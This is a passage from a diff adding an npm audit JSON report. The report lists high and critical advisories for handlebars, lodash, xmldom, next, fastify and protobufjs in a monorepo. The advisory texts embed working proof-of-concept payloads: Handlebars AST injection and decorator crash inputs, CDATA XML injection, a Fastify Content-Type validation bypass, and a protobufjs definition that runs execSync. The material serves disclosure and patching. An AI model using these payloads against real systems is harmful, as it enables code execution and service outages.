require('fs').writeFileSync('pwned4','1'); // \"\nnode -e 'require(\"./out.js\")'\n```\n\n## Workarounds\n\n- **Validate all CLI inputs** before invoking the precompiler. Reject filenames and option values  that contain characters with JavaScript string-escaping significance (`\"`, `'`, `;`, etc.).\n- **Use a fixed, trusted namespace string** passed via a configuration file rather than  command-line arguments in automated pipelines.\n- **Run the precompiler in a sandboxed environment** (container with no write access to sensitive  paths) to limit the impact of successful exploitation.\n- **Audit template filenames** in any repository or package that is consumed by an automated  build pipeline.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection in CLI Precompiler via Unescaped Names and Options",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33941"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-xjpj-3mr7-gcpf",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-30T20:08:53.000Z",
+      "cvss": {
+        "score": 8.3,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-94",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-xjpj-3mr7-gcpf"
+    },
+    "1115693": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            "services__gateway-api>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xhpv-hc6g-r9c6\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33940\n- https://github.com/advisories/GHSA-xhpv-hc6g-r9c6",
+      "created": "2026-03-27T18:21:44.000Z",
+      "id": 1115693,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA crafted object placed in the template context can bypass all conditional guards in `resolvePartial()` and cause `invokePartial()` to return `undefined`. The Handlebars runtime then treats the unresolved partial as a source that needs to be compiled, passing the crafted object to `env.compile()`. Because the object is a valid Handlebars AST containing injected code, the generated JavaScript executes arbitrary commands on the server. The attack requires the adversary to control a value that can be returned by a dynamic partial lookup.\n\n## Description\n\nThe vulnerable code path spans two functions in `lib/handlebars/runtime.js`:\n\n**`resolvePartial()`:** A crafted object with `call: true` satisfies the first branch condition (`partial.call`) and causes an early return of the original object itself, because none of the remaining conditionals (string check, `options.partials` lookup, etc.) match a plain object. The function returns the crafted object as-is.\n\n**`invokePartial()`:** When `resolvePartial` returns a non-function object, `invokePartial` produces `undefined`. The runtime interprets `undefined` as \"partial not yet compiled\" and calls `env.compile(partial, ...)` where `partial` is the crafted AST object. The JavaScript code generator processes the AST and emits JavaScript containing the injected payload, which is then evaluated.\n\n**Minimum prerequisites:**\n1. The template uses a dynamic partial lookup: `{{> (lookup . \"key\")}}` or equivalent.\n2. The adversary can set the value of the looked-up context property to a crafted object.\n\nIn server-side rendering scenarios where templates process user-supplied context data, this enables full Remote Code Execution.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars');\n\nconst vulnerableTemplate = `{{> (lookup . \"payload\")}}`;\n\nconst maliciousContext = {\n  payload: {\n    call: true, // bypasses the primary resolvePartial branch\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          // Injected code breaks out of the generated function's argument list\n          depth: \"0])),function () {console.error('VULNERABLE: object -> dynamic partial -> RCE');}()));//\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n// Prints: VULNERABLE: object -> dynamic partial -> RCE\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars/runtime')`). Without `compile()`,  the fallback compilation path in `invokePartial` is unreachable.\n- **Sanitize context data** before rendering: ensure no value in the context is a non-primitive  object that could be passed to a dynamic partial.\n- **Avoid dynamic partial lookups** (`{{> (lookup ...)}}`) when context data is user-controlled.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection via AST Type Confusion when passing an object as dynamic partial",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33940"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-xhpv-hc6g-r9c6",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-30T20:08:34.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-xhpv-hc6g-r9c6"
+    },
+    "1115694": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            "services__gateway-api>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-9cx6-37pm-9jff\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33939\n- https://github.com/advisories/GHSA-9cx6-37pm-9jff",
+      "created": "2026-03-27T18:21:15.000Z",
+      "id": 1115694,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen a Handlebars template contains decorator syntax referencing an unregistered decorator (e.g. `{{*n}}`), the compiled template calls `lookupProperty(decorators, \"n\")`, which returns `undefined`. The runtime then immediately invokes the result as a function, causing an unhandled `TypeError: ... is not a function` that crashes the Node.js process. Any application that compiles user-supplied templates without wrapping the call in a `try/catch` is vulnerable to a single-request Denial of Service.\n\n## Description\n\nIn `lib/handlebars/compiler/javascript-compiler.js`, the code generated for a decorator invocation looks like:\n\n```javascript\nfn = lookupProperty(decorators, \"n\")(fn, props, container, options) || fn;\n```\n\nWhen `\"n\"` is not a registered decorator, `lookupProperty(decorators, \"n\")` returns `undefined`. The expression immediately attempts to call `undefined` as a function, producing:\n\n```\nTypeError: lookupProperty(...) is not a function\n```\n\nBecause the error is thrown inside the compiled template function and is not caught by the runtime, it propagates up as an unhandled exception and — when not caught by the application — crashes the Node.js process.\n\nThis inconsistency is notable: references to unregistered **helpers** produce a clean `\"Missing helper: ...\"` error, while references to unregistered **decorators** cause a hard crash.\n\n**Attack scenario:** An attacker submits `{{*n}}` as template content to any endpoint that calls `Handlebars.compile(userInput)()`. Each request crashes the server process; with process managers that auto-restart (PM2, systemd), repeated submissions create a persistent DoS.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars'); // Handlebars 4.7.8, Node.js v22.x\n\n// Any of these payloads crash the process\nHandlebars.compile('{{*n}}')({});\nHandlebars.compile('{{*decorator}}')({});\nHandlebars.compile('{{*constructor}}')({});\n```\n\nExpected crash output:\n```\nTypeError: lookupProperty(...) is not a function\n    at Function.eval [as decorator] (eval at compile (...javascript-compiler.js:134:36))\n```\n\n## Workarounds\n\n- **Wrap compilation and rendering in `try/catch`:**\n  ```javascript\n  try {\n    const result = Handlebars.compile(userInput)(context);\n    res.send(result);\n  } catch (err) {\n    res.status(400).send('Invalid template');\n  }\n  ```\n- **Validate template input** before passing it to `compile()`. Reject templates containing  decorator syntax (`{{*...}}`) if decorators are not used in your application.\n- **Use the pre-compilation workflow:** compile templates at build time and serve only pre-compiled  templates; do not call `compile()` at request time.",
+      "reported_by": null,
+      "title": "Handlebars.js has Denial of Service via Malformed Decorator Syntax in Template Compilation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33939"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-9cx6-37pm-9jff",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-30T20:08:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-754"
+      ],
+      "url": "https://github.com/advisories/GHSA-9cx6-37pm-9jff"
+    },
+    "1115806": {
+      "findings": [
+        {
+          "version": "4.17.23",
+          "paths": [
+            ".>commitlint>@commitlint/cli>@commitlint/read>git-raw-commits>lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4800\n- https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-35jh-r3h4-6jhm\n- https://github.com/advisories/GHSA-r5fr-rjxr-66jc",
+      "created": "2026-04-01T23:51:12.000Z",
+      "id": 1115806,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Code Injection via `_.template` imports key names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-4800"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.23",
+      "github_advisory_id": "GHSA-r5fr-rjxr-66jc",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:51:13.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-r5fr-rjxr-66jc"
+    },
+    "1115997": {
+      "findings": [
+        {
+          "version": "0.8.11",
+          "paths": [
+            ".>@expo/config>@expo/config-plugins>@expo/plist>@xmldom/xmldom"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-wh4c-j3r5-mjhp\n- https://github.com/xmldom/xmldom/commit/2b852e836ab86dbbd6cbaf0537f584dd0b5ac184\n- https://github.com/xmldom/xmldom/releases/tag/0.8.12\n- https://github.com/xmldom/xmldom/releases/tag/0.9.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-34601\n- https://github.com/advisories/GHSA-wh4c-j3r5-mjhp",
+      "created": "2026-04-01T00:19:06.000Z",
+      "id": 1115997,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`@xmldom/xmldom` allows attacker-controlled strings containing the CDATA terminator `]]>` to be inserted into a `CDATASection` node. During serialization, `XMLSerializer` emitted the CDATA content verbatim without rejecting or safely splitting the terminator. As a result, data intended to remain text-only became **active XML markup** in the serialized output, enabling XML structure\ninjection and downstream business-logic manipulation.\n\nThe sequence `]]>` is not allowed inside CDATA content and must be rejected or safely handled during serialization. ([MDN Web Docs](https://developer.mozilla.org/))\n\n### Attack surface\n\n`Document.createCDATASection(data)` is the most direct entry point, but it is not the only one. The WHATWG DOM spec intentionally does not validate `]]>` in mutation methods — only `createCDATASection` carries that guard. The following paths therefore also allow `]]>` to enter a CDATASection node and reach the serializer:\n\n- `CharacterData.appendData()`\n- `CharacterData.replaceData()`\n- `CharacterData.insertData()`\n- Direct assignment to `.data`\n- Direct assignment to `.textContent`\n\n(Note: assigning to `.nodeValue` does **not** update `.data` in this implementation — the serializer reads `.data` directly — so `.nodeValue` is not an exploitable path.)\n\n### Parse path\n\nParsing XML that contains a CDATA section is **not** affected. The SAX parser's non-greedy `CDSect` regex stops at the first `]]>`, so parsed CDATA data never contains the terminator.\n\n---\n\n## Impact\n\nIf an application uses `xmldom` to generate \"trusted\" XML documents that embed **untrusted user input** inside CDATA (a common pattern in exports, feeds, SOAP/XML integrations, etc.), an attacker can inject additional XML elements/attributes into the generated document.\n\nThis can lead to:\n\n- Integrity violation of generated XML documents.\n- Business-logic injection in downstream consumers (e.g., injecting `<approved>true</approved>`,  `<role>admin</role>`, workflow flags, or other security-relevant elements).\n- Unexpected privilege/workflow decisions if downstream logic assumes injected nodes cannot appear.\n\nThis issue does **not** require malformed parsers or browser behavior; it is caused by serialization producing attacker-influenced XML markup.\n\n---\n\n## Root Cause (with file + line numbers)\n\n**File:** `lib/dom.js`\n\n### 1. No validation in `createCDATASection`\n\n`createCDATASection: function (data)` accepts any string and appends it directly.\n\n- **Lines 2216–2221** (0.9.8)\n\n### 2. Unsafe CDATA serialization\n\nSerializer prints CDATA sections as:\n\n```\n<![CDATA[ + node.data + ]]>\n```\n\nwithout handling `]]>` in the data.\n\n- **Lines 2919–2920** (0.9.8)\n\nBecause CDATA content is emitted verbatim, an embedded `]]>` closes the CDATA section early and the remainder of the attacker-controlled payload is interpreted as markup in the serialized XML.\n\n---\n\n## Proof of Concept — Fix A: `createCDATASection` now throws\n\nOn patched versions, passing `]]>` directly to `createCDATASection` throws `InvalidCharacterError` instead of silently accepting the payload:\n\n```js\nconst { DOMImplementation } = require('./lib');\n\nconst doc = new DOMImplementation().createDocument(null, 'root', null);\ntry {\n  doc.createCDATASection('SAFE]]><injected attr=\"pwn\"/>');\n  console.log('VULNERABLE — no error thrown');\n} catch (e) {\n  console.log('FIXED — threw:', e.name); // InvalidCharacterError\n}\n```\n\nExpected output on patched versions:\n\n```\nFIXED — threw: InvalidCharacterError\n```\n\n---\n\n## Proof of Concept — Fix B: mutation vector now safe\n\nOn patched versions, injecting `]]>` via a mutation method (`appendData`, `replaceData`, `.data =`, `.textContent =`) no longer produces injectable output. The serializer splits the terminator so the result round-trips as safe text:\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('./lib');\nconst { DOMParser } = require('./lib');\n\nconst doc = new DOMImplementation().createDocument(null, 'root', null);\n\n// Start with safe data, then mutate to include the terminator\nconst cdata = doc.createCDATASection('safe');\ndoc.documentElement.appendChild(cdata);\ncdata.appendData(']]><injected attr=\"pwn\"/><more>TEXT</more><![CDATA[');\n\nconst out = new XMLSerializer().serializeToString(doc);\nconsole.log('Serialized:', out);\n\nconst reparsed = new DOMParser().parseFromString(out, 'text/xml');\nconst injected = reparsed.getElementsByTagName('injected').length > 0;\nconsole.log('Injected element found in reparsed doc:', injected);\n// VULNERABLE: true  |  FIXED: false\n```\n\nExpected output on patched versions:\n\n```\nSerialized: <root><![CDATA[safe]]]]><![CDATA[><injected attr=\"pwn\"/><more>TEXT</more><![CDATA[]]></root>\nInjected element found in reparsed doc: false\n```\n\n---\n\n## Fix Applied\n\nBoth mitigations were implemented:\n\n### Option A — Strict/spec-aligned: reject `]]>` in `createCDATASection()`\n\n`Document.createCDATASection(data)` now throws `InvalidCharacterError` (per the [WHATWG DOM spec](https://dom.spec.whatwg.org/#dom-document-createcdatasection)) when `data` contains `]]>`. This closes the direct entry point.\n\nCode that previously passed a string containing `]]>` to `createCDATASection` and relied on the silent/unsafe behaviour will now receive `InvalidCharacterError`. Use a mutation method such as `appendData` if you intentionally need `]]>` in a CDATASection node's data (the serializer split in Option B will keep the output safe).\n\n### Option B — Defensive serialization: split the terminator during serialization\n\n`XMLSerializer` now replaces every occurrence of `]]>` in CDATA section data with the split sequence `]]]]><![CDATA[>` before emitting. This closes all mutation-vector paths that Option A alone cannot guard, and means the serialized output is always well-formed XML regardless of how `]]>` entered the node.",
+      "reported_by": null,
+      "title": "xmldom: XML injection via unsafe CDATA serialization allows attacker-controlled markup insertion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-34601"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": "<0.8.12",
+      "github_advisory_id": "GHSA-wh4c-j3r5-mjhp",
+      "recommendation": "Upgrade to version 0.8.12 or later",
+      "patched_versions": ">=0.8.12",
+      "updated": "2026-04-06T17:24:49.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-91"
+      ],
+      "url": "https://github.com/advisories/GHSA-wh4c-j3r5-mjhp"
+    },
+    "1116376": {
+      "findings": [
+        {
+          "version": "14.2.35",
+          "paths": [
+            "apps__trading-ui>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-q4gf-8mx6-v5v3\n- https://vercel.com/changelog/summary-of-cve-2026-23869\n- https://github.com/advisories/GHSA-q4gf-8mx6-v5v3",
+      "created": "2026-04-10T15:35:47.000Z",
+      "id": 1116376,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23869](https://github.com/facebook/react/security/advisories/GHSA-479c-33wc-g2pg). You can read more about this advisory our [this changelog](https://vercel.com/changelog/summary-of-cve-2026-23869).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next.js has a Denial of Service with Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0.0 <15.5.15",
+      "github_advisory_id": "GHSA-q4gf-8mx6-v5v3",
+      "recommendation": "Upgrade to version 15.5.15 or later",
+      "patched_versions": ">=15.5.15",
+      "updated": "2026-04-10T15:35:49.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-q4gf-8mx6-v5v3"
+    },
+    "1116644": {
+      "findings": [
+        {
+          "version": "5.8.4",
+          "paths": [
+            "services__gateway-api>fastify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fastify/security/advisories/GHSA-247c-9743-5963\n- https://nvd.nist.gov/vuln/detail/CVE-2025-32442\n- https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4\n- https://github.com/fastify/fastify/releases/tag/v5.8.5\n- https://github.com/advisories/GHSA-247c-9743-5963",
+      "created": "2026-04-15T19:24:41.000Z",
+      "id": 1116644,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA validation bypass vulnerability exists in Fastify v5.x where request body validation schemas specified via `schema.body.content` can be completely circumvented by prepending a single space character (`\\x20`) to the `Content-Type` header. The body is still parsed correctly as JSON (or any other content type), but schema validation is entirely skipped.\nThis is a regression introduced by commit [`f3d2bcb`](https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4) (fix for [CVE-2025-32442](https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc)).\n\n### Details\nThe vulnerability is a **parser-validator differential** between two independent code paths that process the raw `Content-Type` header differently.\n**Parser path** (`lib/content-type.js`, line ~67) applies `trimStart()` before processing:\n```js\nconst type = headerValue.slice(0, sepIdx).trimStart().toLowerCase()\n// ' application/json' → trimStart() → 'application/json' → body is parsed ✓\n```\n\n**Validator path** (`lib/validation.js`, line 272) splits on `/[ ;]/` before trimming:\n\n```js\nfunction getEssenceMediaType(header) {\n  if (!header) return ''\n  return header.split(/[ ;]/, 1)[0].trim().toLowerCase()\n}\n// ' application/json'.split(/[ ;]/, 1) → ['']  (splits on the leading space!)\n// ''.trim() → ''\n// context[bodySchema][''] → undefined → NO validator found → validation skipped!\n```\n\nThe `ContentType` class applies `trimStart()` before processing, so the parser correctly identifies `application/json` and parses the body. However, `getEssenceMediaType` splits on `/[ ;]/` before trimming, so the leading space becomes a split point, producing an empty string. The validator looks up a schema for content-type `\"\"`, finds nothing, and skips validation entirely.\n**Regression source:** Commit [`f3d2bcb`](https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4) (April 18, 2025) changed the split delimiter from `';'` to `/[ ;]/` to fix [CVE-2025-32442](https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc). The old code (`header.split(';', 1)[0].trim()`) was **not** vulnerable to this vector because `.trim()` would correctly handle the leading space. The new regex-based split introduced the regression.\n\n### PoC\n\n```js\nconst fastify = require('fastify')({ logger: false });\n\nfastify.post('/transfer', {\n  schema: {\n    body: {\n      content: {\n        'application/json': {\n          schema: {\n            type: 'object',\n            required: ['amount', 'recipient'],\n            properties: {\n              amount: { type: 'number', maximum: 1000 },\n              recipient: { type: 'string', maxLength: 50 },\n              admin: { type: 'boolean', enum: [false] }\n            },\n            additionalProperties: false\n          }\n        }\n      }\n    }\n  }\n}, async (request) => {\n  return { processed: true, data: request.body };\n});\n\n(async () => {\n  await fastify.ready();\n\n  // BLOCKED — normal request with invalid payload\n  const res1 = await fastify.inject({\n    method: 'POST',\n    url: '/transfer',\n    headers: { 'content-type': 'application/json' },\n    payload: JSON.stringify({ amount: 9999, recipient: 'EVIL', admin: true })\n  });\n  console.log('Normal:', res1.statusCode);\n  // → 400 FST_ERR_VALIDATION\n\n  // BYPASS — single leading space\n  const res2 = await fastify.inject({\n    method: 'POST',\n    url: '/transfer',\n    headers: { 'content-type': ' application/json' },\n    payload: JSON.stringify({ amount: 9999, recipient: 'EVIL', admin: true })\n  });\n  console.log('Leading space:', res2.statusCode);\n  // → 200 (validation bypassed!)\n  console.log('Body:', res2.body);\n\n  await fastify.close();\n})();\n```\n\n**Output:**\n```\nNormal: 400\nLeading space: 200\nBody: {\"processed\":true,\"data\":{\"amount\":9999,\"recipient\":\"EVIL\",\"admin\":true}}\n```\n\n### Impact\nAny Fastify application that relies on <code>schema.body.content</code> (per-content-type body validation) to enforce data integrity or security constraints is affected. An attacker can bypass all body validation by adding a single space before the Content-Type value. The attack requires no authentication and has zero complexity — it is a single-character modification to an HTTP header.\nThis vulnerability is distinct from all previously patched content-type bypasses:\n\nCVE | Vector | Patched in 5.8.4?\n-- | -- | --\nCVE-2025-32442 | Casing / semicolon whitespace | ✅ Yes\nCVE-2026-25223 | Tab character (\\t) | ✅ Yes\nCVE-2026-3419 | Trailing garbage after subtype | ✅ Yes\nThis finding | Leading space (\\x20) | ❌ No\n\n\n**Recommended fix** — add `trimStart()` before the split in `getEssenceMediaType`:\n```js\nfunction getEssenceMediaType(header) {\n  if (!header) return ''\n  return header.trimStart().split(/[ ;]/, 1)[0].trim().toLowerCase()\n}\n```",
+      "reported_by": null,
+      "title": "Fastify has a Body Schema Validation Bypass via Leading Space in Content-Type Header",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33806"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fastify",
+      "vulnerable_versions": ">=5.3.2 <=5.8.4",
+      "github_advisory_id": "GHSA-247c-9743-5963",
+      "recommendation": "Upgrade to version 5.8.5 or later",
+      "patched_versions": ">=5.8.5",
+      "updated": "2026-04-15T19:24:44.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-1287"
+      ],
+      "url": "https://github.com/advisories/GHSA-247c-9743-5963"
+    },
+    "1116832": {
+      "findings": [
+        {
+          "version": "6.8.8",
+          "paths": [
+            "services__adapter-whatsapp-personal>@whiskeysockets/baileys>@whiskeysockets/libsignal-node>protobufjs"
+          ]
+        },
+        {
+          "version": "7.5.4",
+          "paths": [
+            "services__adapter-whatsapp-personal>@whiskeysockets/baileys>protobufjs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-xq3m-2v4x-88gg\n- https://github.com/advisories/GHSA-xq3m-2v4x-88gg",
+      "created": "2026-04-16T22:34:57.000Z",
+      "id": 1116832,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nprotobufjs compiles protobuf definitions into JS functions. Attackers can manipulate these definitions to execute arbitrary JS code.\n\n### Details\nAttackers can inject arbitrary code in the \"type\" fields of protobuf definitions, which will then execute during object decoding using that definition.\n\n### PoC\n```js\nconst protobuf = require('protobufjs');\nmaliciousDescriptor = JSON.parse(`{\"nested\":{\"User\":{\"fields\":{\"id\":{\"type\":\"int32\",\"id\":1},\"data\":{\"type\":\"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\\\nfunction X\",\"id\":2}}},\"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\\\nfunction X\":{\"fields\":{\"content\":{\"type\":\"string\",\"id\":1}}}}}`)\nconst root = protobuf.Root.fromJSON(maliciousDescriptor);\nconst UserType = root.lookupType(\"User\");\nconst userBytes = Buffer.from([0x08, 0x01, 0x12, 0x07, 0x0a, 0x05, 0x68, 0x65, 0x6c, 0x6c, 0x6f]);\ntry {\n    const user = UserType.decode(userBytes);\n} catch (e) {}\n```\n\n### Impact\nRemote code execution when attackers can control the protobuf definition files.",
+      "reported_by": null,
+      "title": "Arbitrary code execution in protobufjs",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41242"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "protobufjs",
+      "vulnerable_versions": "<7.5.5",
+      "github_advisory_id": "GHSA-xq3m-2v4x-88gg",
+      "recommendation": "Upgrade to version 7.5.5 or later",
+      "patched_versions": ">=7.5.5",
+      "updated": "2026-04-18T16:18:24.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-xq3m-2v4x-88gg"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 16,
+      "high": 12,
+      "critical": 3
+    },
+    "dependencies": 1833,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1833
+  }
+}
